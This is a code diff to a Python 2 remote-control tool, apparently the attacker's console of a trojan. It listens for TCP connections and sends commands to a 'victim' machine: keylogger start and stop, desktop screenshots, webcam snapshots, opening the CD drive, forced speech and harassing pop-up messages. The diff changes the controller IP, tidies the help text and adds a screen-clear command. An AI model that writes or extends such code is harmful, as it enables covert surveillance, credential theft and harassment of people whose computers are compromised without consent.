@@ -1,7 +1,7 @@
 import socket, os, time
 import cv2, numpy
  
-ip_address = '192.168.10.11'
+ip_address = '192.168.10.16'
 
 banner ="""                                                  
    (                    *   )               (    (   
@@ -38,9 +38,9 @@ def functions():
     print 'openDrive       --> Open\'s victim CD drive'
     print 'screencap       --> Get a screen shot of the victim\'s desktop'
     print 'startLogger     --> Start keylogger'
-    print 'speak <text>    --> Victim\'s machine talks with custom text passed'
+    print 'speak--<text>   --> Victim\'s machine talks with custom text passed'
     print 'stopLogger      --> Stop keylogger'
-    print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> --> Troll victim with pop ups\n'
+    print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> -->   Troll victim with pop ups\n'
     print """button Codes                  -                 Icon Codes
 0: Normal message box                   16: Critical message icon
 1: OK and Cancel                        32: Warning query icon
@@ -181,6 +181,11 @@ def connect():
             transferImage(conn, image[1], command)
         elif 'snapshot' in command:
             snapshot(conn, command)
+        elif 'cls' in command:
+            os.system('cls')
+            print banner
+            print '[+] Listening for incoming TCP connection on port 8080'
+            print '[+] We got a connection from: ', addr
         elif 'troll' in command:
             try:
                 call, msg, icons, title, times = command.split('--')
